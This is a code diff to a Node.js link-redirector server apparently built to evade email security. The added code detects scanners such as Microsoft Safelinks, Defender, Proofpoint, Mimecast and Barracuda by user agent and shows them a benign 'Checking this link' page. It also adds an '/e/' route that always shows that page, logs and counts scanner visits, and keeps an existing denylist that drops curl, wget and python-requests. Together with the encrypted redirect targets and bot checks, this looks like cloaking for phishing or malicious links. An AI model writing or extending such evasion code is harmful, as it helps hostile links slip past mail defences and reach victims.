@@ -1,4 +1,4 @@
-// server.js — AES redirector + Cloudflare Turnstile, hardened (v4)
+// server.js — AES redirector + Cloudflare Turnstile, hardened (v4.2 Beta)
 require("dotenv").config();
 const express = require("express");
 const crypto = require("crypto");
@@ -489,6 +489,48 @@ function hashFirstSeg(pathStr) {
   }
   return crypto.createHash("sha256").update(first).digest("base64url").slice(0, 32);
 }
+
+/* ================== INSERTED: Interstitial helper (scanner-safe landing) ===================== */
+function renderScannerSafePage(res, nextEnc, reason = "Pre-scan") {
+  res.setHeader("Cache-Control", "no-store");
+  res.type("html").send(`<!doctype html><meta charset="utf-8">
+<title>Checking link…</title>
+<meta name="robots" content="noindex,nofollow">
+<body style="font:16px system-ui;padding:24px;max-width:720px;margin:auto">
+  <h1>Checking this link</h1>
+  <p>This link was pre-scanned by security software. If you’re the recipient, click continue.</p>
+  <p><a href="/challenge?next=${encodeURIComponent(nextEnc)}" rel="noopener">Continue</a></p>
+  <p style="color:#6b7280;font-size:14px">Reason: ${reason}</p>
+</body>`);
+}
+// Known email/link security scanners (NOT general web crawlers)
+const EMAIL_SCANNER_UAS = [
+  "safelinks", "microsoft office", "eop", "defender", "outlook",
+  "proofpoint", "mimecast", "barracuda", "url%20proxy", "apwk"
+].map(s => s.toLowerCase());
+/* ========================================================================== */
+
+/* ================== Scanner logging helper (inserted) ===================== */
+// ---- scanner logging helper (counts + rich log line) ----
+const SCANNER_STATS = { total: 0, byReason: Object.create(null), byUA: Object.create(null) };
+
+function logScannerHit(req, reason, nextEnc) {
+  const ip   = getClientIp(req);
+  const ua   = (req.get("user-agent") || "").slice(0, 160);
+  const path = (req.originalUrl || req.path || "").slice(0, 200);
+  const ref  = (req.get("referer") || req.get("referrer") || "").slice(0, 160);
+  const acc  = (req.get("accept") || "").slice(0, 80);
+
+  // counters
+  SCANNER_STATS.total++;
+  SCANNER_STATS.byReason[reason] = (SCANNER_STATS.byReason[reason] || 0) + 1;
+  const uaKey = ua.toLowerCase().split(/[;\s]/)[0] || "(empty)";
+  SCANNER_STATS.byUA[uaKey] = (SCANNER_STATS.byUA[uaKey] || 0) + 1;
+
+  addLog(`[SCANNER] 200 interstitial ip=${ip} ua="${ua}" path="${path}" accept="${acc}" referer="${ref}" reason=${reason} nextLen=${(nextEnc||"").length}`);
+  addSpacer();
+}
+/* ========================================================================== */
 
 /* ================== Headless / bot heuristic ============================== */
 const UA_HEADLESS_MARKS = [
@@ -998,6 +1040,16 @@ async function handleRedirectCore(req, res, baseString){
 
   if (isBanned(ip)) { addLog(`[BAN] blocked ip=${ip}`); addSpacer(); return res.status(403).send("Forbidden"); }
 
+  // ---------- INSERTED: Email/security scanners -> Interstitial (early, before any blocks) ----------
+  const uaL = ua.toLowerCase();
+  if (EMAIL_SCANNER_UAS.some(b => uaL.includes(b))) {
+    addLog(`[SCANNER] interstitial ip=${ip} ua="${ua.slice(0,80)}"`);
+    const nextEnc = encodeURIComponent(baseString);
+    logScannerHit(req, "Known scanner UA", nextEnc);                  // <- inserted logging call
+    return renderScannerSafePage(res, nextEnc, "Known scanner UA");
+  }
+  // ---------------------------------------------------------------------------------------------------
+
   // (No. 5) Quick UA denylist to drop obvious non-browser clients early
   const BAD_UA = /(okhttp|python-requests|curl|wget|phantomjs)/i;
   if (BAD_UA.test(ua)) {
@@ -1269,6 +1321,26 @@ res.type("html").send(`<!doctype html><html><head>
 </body></html>`);
 });
 
+/* ============== INSERTED: Email-safe path — always show interstitial ================== */
+app.get("/e/:data(*)", (req, res) => {
+  const urlPathFull = (req.originalUrl || "").slice(3); // strip leading "/e/"
+  const clean = urlPathFull.split("?")[0];
+  const nextEnc = encodeURIComponent(clean);
+  addLog(`[INTERSTITIAL] /e path used len=${clean.length}`);
+  logScannerHit(req, "Email-safe path", nextEnc);        // <- inserted logging call
+  return renderScannerSafePage(res, nextEnc, "Email-safe path");
+});
+// HEAD probes on /e should also get 200 interstitial (benign)
+app.head("/e/:data(*)", (req, res) => {
+  const urlPathFull = (req.originalUrl || "").slice(3);
+  const clean = urlPathFull.split("?")[0];
+  const nextEnc = encodeURIComponent(clean);
+  addLog(`[INTERSTITIAL] HEAD /e path`);
+  logScannerHit(req, "HEAD-probe", nextEnc);             // <- inserted logging call
+  return renderScannerSafePage(res, nextEnc, "HEAD-probe");
+});
+/* ===================================================================================== */
+
 /* === DEBUG decrypt — place BEFORE /r and BEFORE '/:data(*)' =============== */
 app.get("/__debug/decrypt", requireAdmin, (req, res) => {
   const d = String(req.query.d || "");
@@ -1293,6 +1365,21 @@ app.get("/:data(*)", async (req, res) => {
   const cleanPath = urlPathFull.split("?")[0];
   return handleRedirectCore(req, res, cleanPath);
 });
+
+/* ================== Admin scanner stats endpoint (inserted) ============== */
+app.get("/admin/scanner-stats", requireAdmin, (req, res) => {
+  res.json({
+    ok: true,
+    total: SCANNER_STATS.total,
+    byReason: SCANNER_STATS.byReason,
+    topUA: Object.entries(SCANNER_STATS.byUA)
+      .sort((a,b) => b[1]-a[1])
+      .slice(0, 20)
+      .map(([ua,count]) => ({ ua, count })),
+    now: new Date().toISOString()
+  });
+});
+/* ======================================================================== */
 
 /* ================== Startup summary ====================================== */
 function startupSummary() {
